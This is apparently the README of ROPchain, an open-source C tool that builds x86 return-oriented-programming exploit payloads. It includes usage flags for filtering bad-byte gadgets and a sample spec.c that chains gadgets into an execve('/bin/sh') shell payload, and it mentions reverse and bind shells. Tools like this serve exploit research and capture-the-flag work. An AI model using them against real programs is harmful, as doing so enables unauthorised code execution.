ROPchain Tool
==========

ROPchain is a x86 systematic ROP payload generation. This tool provides an ROP API library, allowing users to generate customized payload. ROPchain is written in C using Capstone disassembly framework.

Install
-------

To use ROPchain, you have to install [Capstone](http://www.capstone-engine.org/documentation.html) first.

After installing Capstone, download the ROPchain and build it.

    $ git clone git@github.com:SQLab/ropchain.git
    $ cd ropchain
    $ make

Usage
-----

    usage: ropchain <binary_file> [-p <bool>] [-o <offset>]
                    [-b <badbyte>] [-l <length>] [-v <bool>]

    optional arguments:
        -p Print all gadgets. (default true)
        -o Add padding(offset) bytes to payload. (default 0)
        -b Bypass badbyte gadgets. ex: "00|20|0a"
        -l Allow maximum gadget length (default 10)
        -v Show gadgets search verbose (default false)

Tips for rechain gadgets
------------------------

If you want to replace specific gadget, please make good use of "-b" badbyte argument.

For example,

If I don't like this gadget "0x0819a2cd : pop edx; pop ebx; ret",

you can add -b "cd" argument to get another gadget.

Payload Specification
---------------------

Edit spec.c and use the ROP API to generate customized payload.

Default is execve("/bin/sh") and you can do more.

ex: Reverse TCP shell, Bind TCP shell ...

```
#include "spec.h"
int rop_chain_payload(struct Node *root, struct Gadget *head, struct Arg *arg)
{
    struct API *api;
    unsigned int data = 0x080efff0;
    rop_build_api(root, &api, arg);

    printf("\n--- Start chain *execve(\"/bin/sh\")* gadgets ---\n\n");
    rop_chain_list_init(head);

    rop_write_memory_gadget(head, api, data, 0x6e69622f);
    rop_write_memory_gadget(head, api, data + 4, 0x68732f2f);
    rop_write_memory_gadget(head, api, data + 8, 0); 

    rop_write_register_gadget(api, "ebx", data);
    rop_write_register_gadget(api, "ecx", data + 8); 
    rop_write_register_gadget(api, "edx", data + 8); 
    rop_chain_write_register_gadget(head, api);

    rop_zero_register_gadget(head, api, "eax");
    rop_add_register_gadget(head, api, "eax", 11); 
    rop_interrupt_gadget(head, api);

    rop_end_api(api);
    return 0;
}
```
